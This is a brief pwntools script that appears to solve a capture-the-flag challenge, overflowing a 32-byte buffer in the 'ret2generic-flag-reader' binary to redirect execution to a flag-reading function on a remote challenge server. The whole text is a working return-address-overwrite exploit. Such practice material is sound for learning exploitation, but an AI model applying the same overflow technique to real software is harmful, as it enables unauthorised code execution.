from pwn import *

r = remote("mc.ax",31077)
elf = ELF("./ret2generic-flag-reader")
address = p64(elf.symbols.super_generic_flag_reading_function_please_ret_to_me)
buffer = b'A' * 32
payload = buffer + address

r.sendline(payload)
r.interactive()